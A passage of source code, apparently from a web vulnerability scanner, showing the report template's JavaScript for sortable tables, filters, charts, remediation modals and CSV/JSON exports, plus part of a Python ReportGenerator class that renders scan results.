const _S=@@SUBS_JSON@@;
const _P=@@PORTS_JSON@@;
const _RP=new Set([21,22,23,25,53,135,139,445,512,513,514,1433,3306,3389,4444,5432,5900,6379,8080,8443,9200,11211,27017,50070]);
</script>

<script>
'use strict';
// ─────────────────────────────────────────────────────
// UTILITIES
// ─────────────────────────────────────────────────────
const esc=s=>String(s??'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
const ge=id=>document.getElementById(id);

function toast(msg,dur=2200){
  const t=ge('toast');if(!t)return;
  t.textContent=msg;t.classList.add('show');
  clearTimeout(t._tid);t._tid=setTimeout(()=>t.classList.remove('show'),dur);
}
function copyText(txt){
  navigator.clipboard?.writeText(txt)
    .then(()=>toast('Copied: '+String(txt).substring(0,40)))
    .catch(()=>{});
}
function fmtSize(n){
  if(!n||isNaN(n))return'—';
  const u=['B','KB','MB','GB'];let i=0;
  while(n>=1024&&i<3){n/=1024;i++;}
  return (i?n.toFixed(1):n)+' '+u[i];
}
function fmtCVSS(v){
  if(!v||isNaN(v))return'—';
  const c=v>=9?'var(--red)':v>=7?'var(--orange)':v>=4?'var(--amber)':'var(--green)';
  return`<span style="color:${c};font-family:var(--font-mono);font-size:.72rem">${Number(v).toFixed(1)}</span>`;
}

// ─────────────────────────────────────────────────────
// TAB SWITCHING
// ─────────────────────────────────────────────────────
const _sort={};
function switchTab(t){
  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.toggle('on',b.dataset.t===t));
  document.querySelectorAll('.tab').forEach(e=>e.classList.toggle('on',e.id===t));
  if(t==='graph')initGraph();
}
document.querySelectorAll('.tab-btn').forEach(b=>b.addEventListener('click',()=>switchTab(b.dataset.t)));
document.addEventListener('keydown',e=>{
  if(e.key==='Escape')closeModal();
  if(e.target.tagName==='INPUT'||e.target.tagName==='SELECT')return;
  // Number keys for quick tab switching
  const tabKeys={'1':'overview','2':'vulns','3':'urls','4':'leaks','5':'subdomains','6':'ports','7':'dns','8':'ssl','9':'graph'};
  if(tabKeys[e.key])switchTab(tabKeys[e.key]);
});

// ─────────────────────────────────────────────────────
// SORTABLE TABLES
// ─────────────────────────────────────────────────────
function sortTbl(id,col){
  const tbl=ge(id);if(!tbl)return;
  const k=id+col;const dir=_sort[k]==='asc'?'desc':'asc';_sort[k]=dir;
  const rows=[...tbl.querySelectorAll('tbody tr')];
  rows.sort((a,b)=>{
    const av=(a.children[col]?.textContent||'').trim();
    const bv=(b.children[col]?.textContent||'').trim();
    const na=parseFloat(av),nb=parseFloat(bv);
    const va=isNaN(na)?av:na,vb=isNaN(nb)?bv:nb;
    return dir==='asc'?(va>vb?1:va<vb?-1:0):(va<vb?1:va>vb?-1:0);
  });
  const tb=tbl.querySelector('tbody');
  rows.forEach(r=>tb.appendChild(r));
  tbl.querySelectorAll('th').forEach((th,i)=>{
    th.classList.remove('sort-asc','sort-desc');
    if(i===col)th.classList.add(dir==='asc'?'sort-asc':'sort-desc');
  });
}

// ─────────────────────────────────────────────────────
// LIVE FILTERS
// ─────────────────────────────────────────────────────
function liveFilt(tbodyId,filters,countId){
  const tb=ge(tbodyId);if(!tb)return;
  const rows=[...tb.querySelectorAll('tr')];
  let n=0;
  rows.forEach(tr=>{
    const txt=tr.textContent.toLowerCase();
    const ok=filters.every(f=>{
      if(!f.val)return true;
      if(f.col!=null){
        const cell=(tr.children[f.col]?.textContent||'').toLowerCase();
        return cell.includes(f.val.toLowerCase());
      }
      return txt.includes(f.val.toLowerCase());
    });
    tr.style.display=ok?'':'none';
    if(ok)n++;
  });
  const c=ge(countId);if(c)c.textContent=`Showing ${n} of ${rows.length}`;
}

function bind(ids,cb){
  ids.forEach(id=>{
    const el=ge(id);
    if(el&&!el._b){el.addEventListener('input',cb);el.addEventListener('change',cb);el._b=true;}
  });
}

function setupFilters(){
  // Vuln
  const vf=()=>liveFilt('vtbody',[
    {val:ge('vq')?.value},{col:0,val:ge('vsev')?.value},
    {col:2,val:ge('vconf')?.value},{col:1,val:ge('vtype')?.value}
  ],'vcount2');
  bind(['vq','vsev','vconf','vtype'],vf);vf();

  // URL
  const uf=()=>liveFilt('utbody',[{val:ge('urlq')?.value},{col:1,val:ge('urlst')?.value}],'urlcount');
  bind(['urlq','urlst'],uf);uf();

  // Leak
  const lf=()=>liveFilt('lkbody',[
    {val:ge('lkq')?.value},{col:1,val:ge('lksev')?.value},{col:0,val:ge('lkcat')?.value}
  ],'lkcount');
  bind(['lkq','lksev','lkcat'],lf);lf();

  // Subdomain
  const sf=()=>liveFilt('sbbody',[{val:ge('sbq')?.value},{col:3,val:ge('sbalive')?.value}],'sbcount');
  bind(['sbq','sbalive'],sf);sf();

  // Port
  const pf=()=>{
    const tb=ge('ptbody');if(!tb)return;
    const rows=[...tb.querySelectorAll('tr')];let n=0;
    const q=(ge('ptq')?.value||'').toLowerCase();
    const st=(ge('ptstate')?.value||'').toLowerCase();
    const risky=ge('ptrisky')?.checked||false;
    rows.forEach(tr=>{
      const txt=tr.textContent.toLowerCase();
      const isRisky=tr.dataset.risky==='1';
      const ok=(!q||txt.includes(q))&&(!st||txt.includes(st))&&(!risky||isRisky);
      tr.style.display=ok?'':'none';if(ok)n++;
    });
    const c=ge('ptcount');if(c)c.textContent=`Showing ${n} of ${rows.length}`;
  };
  bind(['ptq','ptstate','ptrisky'],pf);pf();

  // DNS
  const df=()=>liveFilt('dnbody',[{val:ge('dnq')?.value},{col:0,val:ge('dnttype')?.value}],'dncount');
  bind(['dnq','dnttype'],df);df();

  // Tech
  const tf=()=>liveFilt('tbody',[{val:ge('tq')?.value}],null);
  bind(['tq'],tf);tf();
}

// ─────────────────────────────────────────────────────
// CLICK-TO-COPY ON TABLE CELLS
// ─────────────────────────────────────────────────────
document.addEventListener('click',e=>{
  const td=e.target.closest('td');
  if(td&&!e.target.closest('a')&&!e.target.closest('button')){
    const t=td.textContent.trim();
    if(t&&t!=='—'&&t.length>1)copyText(t);
  }
});

// ─────────────────────────────────────────────────────
// ANIMATED STAT COUNTERS
// ─────────────────────────────────────────────────────
function animCounters(){
  document.querySelectorAll('.sval').forEach(el=>{
    const n=parseInt(el.textContent);
    if(isNaN(n)||n<=0)return;
    let cur=0;const step=Math.max(1,Math.ceil(n/35));
    const t=setInterval(()=>{
      cur=Math.min(cur+step,n);el.textContent=cur;
      if(cur>=n)clearInterval(t);
    },22);
  });
}

// ─────────────────────────────────────────────────────
// SCORE BAR ANIMATIONS
// ─────────────────────────────────────────────────────
function animBars(){
  document.querySelectorAll('.score-bar-fill,.ml-fill').forEach(el=>{
    const w=el.getAttribute('data-w')||el.style.width;
    el.style.width='0';
    requestAnimationFrame(()=>requestAnimationFrame(()=>{el.style.width=w;}));
  });
}

// ─────────────────────────────────────────────────────
// HEATMAP GENERATION
// ─────────────────────────────────────────────────────
function buildHeatmap(){
  const c=ge('heatmap');if(!c)return;
  const urls=_U.slice(0,300);
  if(!urls.length)return;
  const cols=Math.min(Math.max(Math.ceil(Math.sqrt(urls.length)),1),35);
  c.style.gridTemplateColumns=`repeat(${cols},14px)`;
  const vm=new Map();
  _V.forEach(v=>{
    const u=v.url||'';const cur=vm.get(u)||{n:0,s:'info'};
    cur.n++;
    const so={critical:5,high:4,medium:3,low:2,info:1};
    if((so[v.severity?.toLowerCase()]||0)>(so[cur.s]||0))cur.s=v.severity.toLowerCase();
    vm.set(u,cur);
  });
  const sc={critical:'hm-5',high:'hm-4',medium:'hm-3',low:'hm-2',info:'hm-1'};
  const frag=document.createDocumentFragment();
  urls.forEach(u=>{
    const d=document.createElement('div');
    const vd=vm.get(u.url);
    d.className='hm-cell '+(vd?sc[vd.s]:'hm-0');
    const label=(u.url||'').split('/').filter(Boolean).pop()?.substring(0,28)||'/';
    d.setAttribute('data-tip',label+(vd?` (${vd.n} vuln${vd.n>1?'s':''})`:''));
    d.addEventListener('click',()=>copyText(u.url));
    frag.appendChild(d);
  });
  c.appendChild(frag);
}

// ─────────────────────────────────────────────────────
// CHART RENDERING
// ─────────────────────────────────────────────────────
Chart.defaults.color='#6e7488';
Chart.defaults.borderColor='rgba(0,210,255,.07)';
const PAL=['#ff3366','#ff6633','#ffaa00','#00d2ff','#b060ff','#00ff88','#ff99cc','#44ccff','#ffcc66','#88ff44','#cc66ff','#66aaff'];
const TT={backgroundColor:'rgba(8,8,14,.97)',titleFont:{family:'Share Tech Mono',size:11},
  bodyFont:{family:'DM Mono',size:11},padding:10,cornerRadius:3,borderColor:'rgba(0,210,255,.2)',borderWidth:1};

function mkDonut(id,labels,data,colors){
  const ctx=ge(id);if(!ctx)return;
  new Chart(ctx,{type:'doughnut',
    data:{labels,datasets:[{data,backgroundColor:colors||PAL,borderColor:'#040406',borderWidth:2}]},
    options:{responsive:true,maintainAspectRatio:false,cutout:'62%',
      plugins:{legend:{position:'right',labels:{color:'#6e7488',font:{family:'Share Tech Mono',size:10},padding:10,boxWidth:11}},
        tooltip:{...TT}}}});
}
function mkBar(id,labels,data,colors,horiz=false,stacked=false){
  const ctx=ge(id);if(!ctx)return;
  new Chart(ctx,{type:'bar',
    data:{labels,datasets:[{data,backgroundColor:colors||PAL,borderWidth:0,borderRadius:3}]},
    options:{responsive:true,maintainAspectRatio:false,indexAxis:horiz?'y':'x',
      plugins:{legend:{display:false},tooltip:{...TT}},
      scales:{
        y:{beginAtZero:true,stacked,grid:{color:'rgba(0,210,255,.05)'},ticks:{color:'#6e7488',font:{family:'Share Tech Mono',size:9}}},
        x:{stacked,grid:{display:horiz},ticks:{color:'#6e7488',font:{family:'Share Tech Mono',size:9}}}
      }}});
}

function buildCharts(){
  // Severity doughnut
  const sevOrd=['CRITICAL','HIGH','MEDIUM','LOW','INFO'];
  const sevC=sevOrd.map(s=>_V.filter(v=>v.severity===s).length);
  mkDonut('chart-sev',sevOrd.map((s,i)=>s+' ('+sevC[i]+')'),sevC,
    ['#ff3366','#ff6633','#ffaa00','#00d2ff','#3a3e52']);

  // Vuln type bar (horizontal)
  const tm={};_V.forEach(v=>{tm[v.vuln_type]=(tm[v.vuln_type]||0)+1;});
  const te=Object.entries(tm).sort((a,b)=>b[1]-a[1]).slice(0,12);
  mkBar('chart-type',te.map(e=>e[0]),te.map(e=>e[1]),te.map((_,i)=>PAL[i%PAL.length]),true);

  // Status doughnut
  const sm={};_U.forEach(u=>{const c=String(u.status||'?');sm[c]=(sm[c]||0)+1;});
  const se=Object.entries(sm).sort((a,b)=>a[0].localeCompare(b[0]));
  mkDonut('chart-status',se.map(e=>e[0]),se.map(e=>e[1]));

  // Leak categories bar
  const lm={};_L.forEach(l=>{lm[l.category]=(lm[l.category]||0)+1;});
  const le=Object.entries(lm).sort((a,b)=>b[1]-a[1]).slice(0,10);
  mkBar('chart-leaks',le.map(e=>e[0]),le.map(e=>e[1]),le.map((_,i)=>PAL[i%PAL.length]),true);

  // Open ports bar
  const op=_P.filter(p=>p.state==='open').slice(0,15);
  mkBar('chart-ports',op.map(p=>p.port+'/'+p.service),op.map(()=>1),
    op.map(p=>_RP.has(p.port)?'#ff3366':'#00d2ff'));

  // Confidence doughnut
  const cm={};_V.forEach(v=>{cm[v.confidence]=(cm[v.confidence]||0)+1;});
  const ce=Object.entries(cm);
  mkDonut('chart-conf',ce.map(e=>e[0]),ce.map(e=>e[1]),['#00ff88','#ffaa00','#00d2ff']);

  // Tech bar
  const tdata=@@TECH_CHART_DATA@@;
  if(tdata.labels.length)mkBar('chart-tech',tdata.labels,tdata.values,
    tdata.labels.map((_,i)=>PAL[i%PAL.length]),true);
}

// ─────────────────────────────────────────────────────
// GRAPH VISUALIZATION
// ─────────────────────────────────────────────────────
let _gInit=false;
function initGraph(){
  if(_gInit)return;_gInit=true;
  const c=ge('gc');if(!c||typeof vis==='undefined')return;
  const nodes=new vis.DataSet(@@GRAPH_NODES@@);
  const edges=new vis.DataSet(@@GRAPH_EDGES@@);
  const net=new vis.Network(c,{nodes,edges},{
    layout:{improvedLayout:false},
    nodes:{shape:'dot',size:8,
      color:{background:'#131320',border:'#00d2ff',
        highlight:{background:'#1b1b2c',border:'#00ffff'},
        hover:{background:'#1b1b2c',border:'#00ff88'}},
      font:{color:'#6e7488',face:'Share Tech Mono',size:10},borderWidth:1,borderWidthSelected:2},
    edges:{smooth:{type:'continuous',roundness:.2},
      color:{color:'rgba(0,210,255,.14)',highlight:'#00d2ff',hover:'#00ff88'},
      arrows:{to:{enabled:true,scaleFactor:.4}},width:.7},
    physics:{barnesHut:{gravitationalConstant:-5500,centralGravity:.25,springLength:85,springConstant:.03},
      stabilization:{iterations:90,updateInterval:25}},
    interaction:{hover:true,navigationButtons:true,keyboard:{enabled:true,bindToWindow:false},tooltipDelay:150}
  });
  net.on('click',p=>{if(p.nodes.length){const n=nodes.get(p.nodes[0]);if(n?.title)copyText(n.title);}});
  window._vn=net;
}

// ─────────────────────────────────────────────────────
// VULN MODAL
// ─────────────────────────────────────────────────────
const _SC={critical:'br',high:'bo',medium:'by',low:'bc',info:'bd'};
const _CC={confirmed:'bg',likely:'by',possible:'bc'};
const _REM={
  XSS:    ['Encode all output in the correct context (HTML/JS/CSS/URL)','Implement Content Security Policy with nonce-based script allowlisting','Set HttpOnly, Secure, and SameSite=Strict on all session cookies','Use framework auto-escaping (React JSX, Angular interpolation, Jinja2 autoescape)','Validate and whitelist input length and character set server-side'],
  SQLI:   ['Use parameterised queries or prepared statements exclusively','Apply principle of least privilege to all database service accounts','Disable verbose database error messages in production responses','Implement Web Application Firewall rules for SQLi pattern detection','Audit all string concatenation touching DB query construction'],
  SSRF:   ['Whitelist allowed destination IP ranges, hostnames, and ports','Block access to cloud metadata endpoints (169.254.169.254, fd00:ec2::254)','Enforce egress proxy with strict outbound allowlisting','Validate and canonicalise all user-supplied URLs before fetching','Disable automatic URL redirects on internal HTTP clients'],
  XXE:    ['Disable external entity processing and DTD expansion in all XML parsers','Prefer JSON over XML for data interchange wherever possible','If XML is required, configure parser with FEATURE_SECURE_PROCESSING flag','Validate XML structure against strict schema before processing'],
  LFI:    ['Validate all file path inputs against a hard-coded allowlist','Use realpath() and verify the result starts with an allowed base directory','Never pass unsanitised user input directly to filesystem functions','Implement chroot jails or container isolation for file-reading services'],
  RCE:    ['Urgently isolate affected systems from network access','Apply vendor security patches immediately or remove the vulnerable component','Eliminate all shell=True subprocess calls; use argument arrays instead','Enable Mandatory Access Control (SELinux, AppArmor) to limit blast radius','Implement code integrity monitoring with AIDE or Tripwire'],
  IDOR:   ['Implement server-side authorisation checks for every resource access request','Replace sequential IDs with cryptographically random UUIDs / opaque tokens','Log all authorisation failures and alert on anomalous access patterns','Never trust client-supplied object identifiers without verification'],
  JWT:    ['Reject any token using the "none" algorithm in the header','Use asymmetric signing (RS256 or ES256); never expose the private key','Validate iss, aud, exp, and nbf claims on every incoming request','Rotate signing keys on a regular schedule and maintain a revocation list'],
  SSTI:   ['Never render user-controlled input through a template engine','Use sandbox modes or restricted execution environments where available','Whitelist allowed template variables and block access to globals/__builtins__'],
  OPEN:   ['Validate all redirect targets against a strict allowlist of safe internal paths','Reject absolute URLs supplied by users for redirect destinations','Use relative paths for internal redirects and log all redirections'],
  default:['Apply vendor security patch or upgrade to the latest supported version','Add WAF rule to block known exploit patterns for this vulnerability class','Review application logic for similar vulnerability patterns across all endpoints','Schedule follow-up penetration test after remediation is complete']
};
const _REFS={
  XSS:   ['https://owasp.org/www-community/attacks/xss/','https://portswigger.net/web-security/cross-site-scripting','https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'],
  SQLI:  ['https://owasp.org/www-community/attacks/SQL_Injection','https://portswigger.net/web-security/sql-injection','https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'],
  SSRF:  ['https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/','https://portswigger.net/web-security/ssrf'],
  XXE:   ['https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing','https://portswigger.net/web-security/xxe'],
  RCE:   ['https://owasp.org/www-project-top-ten/','https://portswigger.net/web-security/os-command-injection'],
  default:['https://owasp.org/www-project-top-ten/','https://nvd.nist.gov/','https://portswigger.net/web-security']
};
function getRem(t){const k=Object.keys(_REM).find(k=>t.toUpperCase().includes(k));return _REM[k]||_REM.default;}
function getRefs(t,cve){const k=Object.keys(_REFS).find(k=>t.toUpperCase().includes(k));const r=[...(_REFS[k]||_REFS.default)];if(cve)r.unshift('https://nvd.nist.gov/vuln/detail/'+cve);return r;}

function showVulnModal(idx){
  const v=_V[idx];if(!v)return;
  ge('m-title').textContent=v.vuln_type;
  const ms=ge('m-sev');ms.className='badge '+(_SC[v.severity?.toLowerCase()]||'bd');ms.textContent=(v.severity||'').toUpperCase();
  const mc=ge('m-conf');mc.className='badge '+(_CC[v.confidence]||'bc');mc.textContent=v.confidence||'';
  const cveLink=v.cve?`<a href="https://nvd.nist.gov/vuln/detail/${esc(v.cve)}" target="_blank" class="badge cve-link">${esc(v.cve)} &#8599;</a>`:'—';
  ge('m-kv').innerHTML=[
    ['URL',        `<span style="font-family:var(--font-mono);font-size:.65rem;color:var(--cyan);word-break:break-all">${esc(v.url)}</span>`],
    ['Parameter',  `<code class="inline">${esc(v.parameter||'—')}</code>`],
    ['Payload',    `<code class="inline" style="color:#ff6633">${esc(v.payload||'—')}</code>`],
    ['CVE',        cveLink],
    ['CVSS',       fmtCVSS(v.cvss)],
    ['Confidence', `<span class="badge ${_CC[v.confidence]||'bc'}">${esc(v.confidence||'?')}</span>`],
    ['Description',`<span style="line-height:1.7">${esc(v.description||'—')}</span>`],
  ].map(([k,v])=>`<div class="kv-k">${k}</div><div class="kv-v">${v}</div>`).join('');
  ge('m-evidence').textContent=v.evidence||v.context||'No evidence captured for this finding.';
  const rem=v.remediation||(getRem(v.vuln_type).map((s,i)=>`${i+1}. ${s}`).join('
'));
  ge('m-rem').textContent=rem;
  ge('m-refs').innerHTML=getRefs(v.vuln_type,v.cve).map(r=>`<div>&#8594; <a href="${esc(r)}" target="_blank">${esc(r)}</a></div>`).join('');
  ge('modal').classList.add('open');
}
function closeModal(){document.querySelectorAll('.modal-bg').forEach(m=>m.classList.remove('open'));}
document.querySelectorAll('.modal-bg').forEach(bg=>bg.addEventListener('click',e=>{if(e.target===bg)closeModal();}));

// ─────────────────────────────────────────────────────
// REMEDIATION ACCORDIONS
// ─────────────────────────────────────────────────────
document.querySelectorAll('.rem-hdr').forEach(h=>{
  h.addEventListener('click',()=>{
    h.classList.toggle('open');
    const b=h.nextElementSibling;if(b)b.classList.toggle('open');
  });
});

// ─────────────────────────────────────────────────────
// EXPORTS
// ─────────────────────────────────────────────────────
function dlBlob(content,type,name){
  const a=document.createElement('a');
  a.href=URL.createObjectURL(new Blob([content],{type}));
  a.download=name;a.click();URL.revokeObjectURL(a.href);
}
function csvRow(arr){return arr.map(c=>'"'+String(c??'').replace(/"/g,'""')+'"').join(',');}
function exportVulnsCSV(){
  const hdr=['Type','Severity','Confidence','CVE','CVSS','URL','Parameter','Payload','Description','Remediation'];
  const rows=[hdr,..._V.map(v=>[v.vuln_type,v.severity,v.confidence,v.cve||'',v.cvss||'',v.url,v.parameter,v.payload,v.description,v.remediation])];
  dlBlob(rows.map(csvRow).join('
'),'text/csv','aegis_vulns_@@TARGET@@.csv');
}
function exportVulnsJSON(){dlBlob(JSON.stringify(_V,null,2),'application/json','aegis_vulns_@@TARGET@@.json');}
function exportLeaksCSV(){
  const hdr=['Category','Severity','Key','Value','Source URL','Context'];
  dlBlob([hdr,..._L.map(l=>[l.category,l.severity,l.key||'',l.value,l.source_url,l.context])].map(csvRow).join('
'),'text/csv','aegis_leaks_@@TARGET@@.csv');
}
function exportURLsCSV(){
  const hdr=['URL','Status','Size','Title','Forms','Content-Type'];
  dlBlob([hdr,..._U.map(u=>[u.url,u.status,u.size,u.title,u.forms,u.ct||''])].map(csvRow).join('
'),'text/csv','aegis_urls_@@TARGET@@.csv');
}
function exportSubsCSV(){
  const hdr=['Subdomain','IPs','Status','Alive','Technologies','CNAMEs','Source'];
  dlBlob([hdr,..._S.map(s=>[s.subdomain,(s.ips||[]).join(';'),s.status,s.alive?'YES':'NO',(s.techs||[]).join(';'),(s.cnames||[]).join(';'),s.source])].map(csvRow).join('
'),'text/csv','aegis_subs_@@TARGET@@.csv');
}
function exportReport(){
  dlBlob(JSON.stringify({target:'@@TARGET@@',generated:'@@GENERATED@@',version:'@@VERSION@@',
    vulnerabilities:_V,urls:_U,leaks:_L,subdomains:_S,ports:_P},null,2),
    'application/json','aegis_report_@@TARGET@@.json');
}

// ─────────────────────────────────────────────────────
// INIT
// ─────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded',()=>{
  animCounters();
  animBars();
  buildHeatmap();
  buildCharts();
  setupFilters();
});
</script>
</body>
</html>
"""



class ReportGenerator:
    _NONE_SSL_HTML = '<div style="color:var(--t3);font-size:.72rem">None detected</div>'

    """Generate HTML, JSON, CSV, and Markdown reports from ScanResults."""

    RISKY_PORTS = {21,23,135,139,445,1433,3389,5900,6379,27017,11211,2375}

    def __init__(self, config: ScanConfig):
        self.config = config

    def generate_all(self, results: "ScanResults"):
        out = self.config.output_dir
        # JSON
        self._write_json(results, out / "report.json")
        # CSV vulns
        self._write_vuln_csv(results, out / "vulnerabilities.csv")
        # CSV URLs
        self._write_url_csv(results,  out / "urls.csv")
        # HTML
        html = self._render_html(results)
        (out / "report.html").write_text(html, encoding="utf-8")
        cprint(f"[bold green]  ✓ HTML report:[/bold green] {out / 'report.html'}")
        cprint(f"[bold green]  ✓ JSON report:[/bold green] {out / 'report.json'}")
        cprint(f"[bold green]  ✓ Vuln CSV:   [/bold green] {out / 'vulnerabilities.csv'}")

    # ── JSON ──────────────────────────────────────────
    def _write_json(self, r: "ScanResults", path: Path):
        data = {
            "meta":         {"target": r.target, "start": r.start_time,
                             "end": r.end_time, "duration": r.duration,
                             "version": VERSION},
            "ml_scores":    r.ml_scores,
            "statistics":   self._stats(r),
            "vulnerabilities": [asdict(v) for v in r.vulns],
            "findings":     [asdict(f) for f in r.findings],
            "crawl":        [
                {"url": c.url, "status": c.status_code, "title": c.title,
                 "size": c.size, "forms": len(c.forms)} for c in r.crawl
            ],
            "dns":          [asdict(d) for d in r.dns],
            "ports":        [asdict(p) for p in r.ports],
            "subdomains":   [asdict(s) for s in r.subdomains],
            "ssl":          asdict(r.ssl) if r.ssl else None,
            "technologies": [asdict(t) for t in r.technologies],
            "osint":        r.osint,
            "whois":        r.whois,
        }
        path.write_text(safe_json_dumps(data, indent=2), encoding="utf-8")

    def _write_vuln_csv(self, r: "ScanResults", path: Path):
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["Type","Severity","Confidence","URL","Parameter","Payload","Description","Remediation"])
            for v in r.vulns:
                w.writerow([v.vuln_type, v.severity, v.confidence, v.url,
                            v.parameter, v.payload[:100], v.description, v.remediation])

    def _write_url_csv(self, r: "ScanResults", path: Path):
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["URL","Status","Size","Title","Forms","ContentType"])
            for c in r.crawl:
                w.writerow([c.url, c.status_code, c.size, c.title,
                            len(c.forms), c.content_type])

    def _stats(self, r: "ScanResults") -> Dict[str, Any]:
        return {
            "urls":            len(r.crawl),
            "vulns":           len(r.vulns),
            "findings":        len(r.findings),
            "subdomains":      len(r.subdomains),
            "open_ports":      sum(1 for p in r.ports if p.state == "open"),
            "dns_records":     len(r.dns),
            "technologies":    len(r.technologies),
            "graph_nodes":     len(r.graph_nodes),
            "graph_edges":     len(r.graph_edges),
        }

    # ── HTML RENDER ───────────────────────────────────
    def _render_html(self, r: "ScanResults") -> str:
        e = html_lib.escape
        ml  = r.ml_scores
        risk = ml.get("risk_level", "INFO")

        # ── Chart data dicts ──────────────────────────
        status_counter = Counter(c.status_code for c in r.crawl)
        status_data = json.dumps({
            "labels": [str(k) for k in sorted(status_counter)],
            "values": [status_counter[k] for k in sorted(status_counter)],
        })

        sev_counter = Counter(v.severity for v in r.vulns)
        sev_order   = ["critical","high","medium","low","info"]
        sev_data = json.dumps({
            "labels": [s.capitalize() for s in sev_order if sev_counter[s]],
            "values": [sev_counter[s] for s in sev_order if sev_counter[s]],
        })

        vuln_counter = Counter(v.vuln_type for v in r.vulns)
        vuln_data = json.dumps({
            "labels": list(vuln_counter.keys()),
            "values": list(vuln_counter.values()),
        })

        leak_counter = Counter(f.category for f in r.findings)
        leak_data = json.dumps({
            "labels": list(leak_counter.keys()),
            "values": list(leak_counter.values()),
        })

        risky_ports_set = self.RISKY_PORTS
        open_ports = [p for p in r.ports if p.state == "open"]
        port_data = json.dumps({
            "labels": [f"{p.port}/{p.service}" for p in open_ports[:20]],
            "values": [1] * len(open_ports[:20]),
            "colors": [
                "#ff3366" if p.port in risky_ports_set else "#00d2ff"
                for p in open_ports[:20]
            ],
        })

        # ── Graph data ────────────────────────────────
        nodes_list = list(r.graph_nodes)[:300]
        node_idx   = {n: i for i, n in enumerate(nodes_list)}
        graph_nodes_js = json.dumps([
            {"id": i, "label": n.split("/")[-1][:28] or "/", "title": n}
            for i, n in enumerate(nodes_list)
        ])
        graph_edges_js = json.dumps([
            {"from": node_idx[s], "to": node_idx[d]}
            for s, d in r.graph_edges
            if s in node_idx and d in node_idx
        ][:500])

        # ── Table rows ────────────────────────────────
        vuln_rows = "\n".join(self._vuln_row(v, i) for i, v in enumerate(r.vulns))
        url_rows  = "\n".join(self._url_row(c)  for c in r.crawl[:500])
        leak_rows = "\n".join(self._leak_row(f) for f in r.findings[:500])
        sub_rows  = "\n".join(self._sub_row(s)  for s in r.subdomains)
        port_rows = "\n".join(self._port_row(p) for p in r.ports)
        dns_rows  = "\n".join(self._dns_row(d)  for d in r.dns)
        tech_rows = "\n".join(self._tech_row(t) for t in r.technologies)

        # ── DNS issues ────────────────────────────────
        dns_issues = self._render_dns_issues(r)

        # ── SSL section ───────────────────────────────
        ssl_section = self._render_ssl(r)

        # ── OSINT section ─────────────────────────────
        osint_section = self._render_osint(r)

        # ── Score section ─────────────────────────────
        scores_section = self._render_scores(ml)

        # ── Numeric stats ─────────────────────────────
        crit_high = sum(1 for v in r.vulns if v.severity in ("critical","high"))
        alive_subs = sum(1 for s in r.subdomains if s.alive)
        risky_port_count = sum(1 for p in r.ports if p.state=="open" and p.port in risky_ports_set)

        # ── Embedded JSON for client-side filter/sort/export ──────────────
        vulns_json = json.dumps([
            {"vuln_type": v.vuln_type, "url": v.url, "parameter": v.parameter,
             "payload": v.payload, "evidence": v.evidence, "severity": v.severity.upper(),
             "confidence": v.confidence, "description": v.description,
             "remediation": v.remediation, "cve": v.cve,
             "cvss": v.cvss if v.cvss else None}
            for v in r.vulns], default=str)

        urls_json = json.dumps([
            {"url": c.url, "status": c.status_code, "size": c.size,
             "title": c.title, "forms": len(c.forms), "ct": c.content_type}
            for c in r.crawl[:800]], default=str)

        leaks_json = json.dumps([
            {"category": f.category, "key": f.key, "value": f.value,
             "source_url": f.source_url, "severity": f.severity.upper(), "context": f.context}
            for f in r.findings[:800]], default=str)

        subs_json = json.dumps([
            {"subdomain": s.subdomain, "ips": s.ip_addresses, "cnames": s.cnames,
             "status": s.status_code, "alive": s.alive,
             "techs": list(s.technologies), "source": s.source}
            for s in r.subdomains], default=str)

        ports_json = json.dumps([
            {"port": p.port, "state": p.state, "service": p.service,
             "version": p.version, "banner": p.banner}
            for p in r.ports], default=str)

        tech_counter = Counter(t.category for t in r.technologies if t.category)
        tech_chart_data = json.dumps({
            "labels": list(tech_counter.keys())[:14],
            "values": list(tech_counter.values())[:14],
        })

        # ── Unique filter dropdown options ─────────────────────────────────
        vuln_types = sorted(set(v.vuln_type for v in r.vulns))
        vuln_type_options = "".join(
            f'<option value="{e(vt)}">{e(vt)}</option>' for vt in vuln_types
        )
        leak_cats = sorted(set(f.category for f in r.findings))
        leak_cat_options = "".join(
            f'<option value="{e(lc)}">{e(lc)}</option>' for lc in leak_cats
        )

        # ── New derived stats ──────────────────────────────────────────────
        cve_count   = sum(1 for v in r.vulns if v.cve)
        duration_s  = round(r.duration, 1) if r.duration else 0
        edge_count  = len(r.graph_edges)

        # ── Critical/High rows for overview quick-list ─────────────────────
        crit_rows = "\n".join(
            self._crit_row(v, i) for i, v in enumerate(r.vulns)
            if v.severity.lower() in ("critical", "high")
        )

        # ── Remediation tab ────────────────────────────────────────────────
        remediation_section = self._render_remediation(r)

        html = _HTML_TEMPLATE
        repl = {
            "@@TARGET@@":              e(r.target),
            "@@GENERATED@@":           datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
            "@@VERSION@@":             VERSION,
            "@@RISK@@":                risk,
            "@@STAT_DURATION@@":       str(duration_s),
            "@@SCORES_SECTION@@":      scores_section,
            "@@STAT_URLS@@":           str(len(r.crawl)),
            "@@STAT_FORMS@@":          str(sum(len(c.forms) for c in r.crawl)),
            "@@STAT_VULNS@@":          str(len(r.vulns)),
            "@@STAT_CRIT@@":           str(crit_high),
            "@@STAT_CVES@@":           str(cve_count),
            "@@STAT_LEAKS@@":          str(len(r.findings)),
            "@@STAT_SUBS@@":           str(len(r.subdomains)),
            "@@STAT_ALIVE@@":          str(alive_subs),
            "@@STAT_PORTS@@":          str(sum(1 for p in r.ports if p.state == "open")),
            "@@STAT_RISKY@@":          str(risky_port_count),
            "@@STAT_TECH@@":           str(len(r.technologies)),
            "@@STAT_DNS@@":            str(len(r.dns)),
            "@@STAT_NODES@@":          str(len(r.graph_nodes)),
            "@@STAT_EDGES@@":          str(edge_count),
